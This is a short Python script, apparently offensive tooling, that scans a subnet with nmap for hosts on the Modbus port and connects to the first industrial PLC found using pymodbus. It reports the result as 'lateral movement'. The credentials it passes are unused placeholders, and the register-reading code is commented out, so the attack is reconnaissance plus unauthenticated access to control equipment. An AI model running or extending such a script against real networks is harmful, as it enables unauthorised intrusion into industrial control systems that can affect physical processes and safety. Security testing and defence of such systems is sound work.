import socket
import subprocess
import re
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import time

# Configuration
DEFAULT_USERNAME = "admin"  # ***REPLACE WITH ACTUAL DEFAULT USERNAME***
DEFAULT_PASSWORD = "password"  # ***REPLACE WITH ACTUAL DEFAULT PASSWORD***
PLC_PORT = 502  # Standard Modbus port
NMAP_SUBNET = "192.168.1.0/24" #Change it to your subnet range, where your PLC lies in.
NMAP_TIMEOUT = "30s" #timeout for the nmap scanner

# Function to discover PLC IP address using nmap
def discover_plc_ip(subnet, timeout):
    try:
        # Run nmap to scan for devices with Modbus port open
        result = subprocess.run(['nmap', '-p', str(PLC_PORT), '-T4', subnet, '-oG', '-', '--host-timeout', timeout], capture_output=True, text=True, check=True) # -T4 flag to set the timing template to aggressive to speedup the scan

        # Parse nmap output to find the PLC IP address
        output = result.stdout
        for line in output.splitlines():
            if "open" in line and "tcp" in line:
                match = re.search(r'Host: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    ip_address = match.group(1)
                    print(f"Found PLC IP Address: {ip_address}")
                    return ip_address
        print("No PLC device found with Modbus port open.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Nmap scan failed with error: {e}")
        return None
    except FileNotFoundError:
        print("Nmap is not installed. Please install nmap and ensure it is in your system's PATH.")
        return None

# Function to attempt Modbus connection
def attempt_modbus_connection(plc_ip, username, password):
    try:
        # Create Modbus TCP client
        client = ModbusTcpClient(plc_ip, port=PLC_PORT, timeout=5)

        # Attempt to connect
        connection = client.connect()

        if connection:
            print(f"Successfully connected to PLC at {plc_ip} without authentication (assuming none required by default).") #Modbus by default does not require any authentication
            #Add your code here, if you want to read any data
            # Example: Read holding registers (adjust register address and count as needed)
            #response = client.read_holding_registers(address=0, count=10, unit=1)
            #if not response.isError():
            #    print("Holding Registers:", response.registers)
            #else:
            #    print("Error reading holding registers:", response)

            # Add some delay before closing the connection to allow for data exchange
            time.sleep(2)
            client.close()
            print("Connection closed.")
            return True
        else:
            print(f"Failed to connect to PLC at {plc_ip}.")
            return False

    except socket.timeout:
        print(f"Connection to {plc_ip} timed out.")
        return False
    except ConnectionRefusedError:
        print(f"Connection to {plc_ip} refused.  Is the PLC running and accepting connections on port {PLC_PORT}?")
        return False
    except ModbusException as e:
        print(f"Modbus error: {e}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return False

# Main execution
if __name__ == "__main__":
    print("Starting PLC IP discovery...")
    plc_ip_address = discover_plc_ip(NMAP_SUBNET, NMAP_TIMEOUT)

    if plc_ip_address:
        print("Attempting to connect to PLC using default credentials...")
        success = attempt_modbus_connection(plc_ip_address, DEFAULT_USERNAME, DEFAULT_PASSWORD)

        if success:
            print("Lateral movement successful (connection established with default credentials).")
        else:
            print("Lateral movement failed.")
    else:
        print("PLC IP address discovery failed.  Exiting.")